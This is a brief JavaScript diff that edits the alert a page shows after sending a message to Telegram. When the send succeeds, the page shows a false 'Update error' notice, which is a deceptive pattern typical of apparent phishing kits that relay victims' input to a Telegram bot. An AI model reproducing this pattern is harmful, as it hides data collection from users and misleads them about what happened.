@@ -43,7 +43,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        alert('Please try again in 24hrs.');
+                        alert('Update error please try again in 24hrs.');
                     } else {
                         alert('Error sending message to Telegram.');
                     }
